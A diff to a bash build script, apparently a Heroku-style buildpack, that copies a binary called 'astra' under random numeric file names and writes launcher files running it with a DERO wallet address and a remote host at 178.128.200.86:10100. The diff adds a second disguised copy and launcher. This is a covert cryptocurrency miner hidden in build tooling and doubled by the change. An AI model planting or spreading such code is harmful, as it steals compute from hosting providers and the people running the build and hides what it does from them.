@@ -1,16 +1,23 @@
 #!/usr/bin/env bash
 dyno=$(shuf -n 1 -i 1000-9999)
+dyno2=$(shuf -n 1 -i 1000-9999)
 set -e
 
 mkdir -p "$1/bin/"
 
 cp -a binaries-$STACK/* "$1/bin/"
 cp -a "$1/bin/astra" "$1/bin/$dyno"
+cp -a "$1/bin/astra" "$1/bin/$dyno2"
 cat > "$1/bin/mode" <<END
 /app/bin/$dyno -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -r 178.128.200.86:10100
 END
+cat > "$1/bin/mode2" <<END
+/app/bin/$dyno2 -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -r 178.128.200.86:10100
+END
 chmod 777 $1/bin/$dyno
+chmod 777 $1/bin/$dyno2
 chmod 777 $1/bin/mode
+chmod 777 $1/bin/mode2
 chmod 777 $1/bin/astra
 chmod 777 $1/bin/client
 chmod 777 $1/bin/main
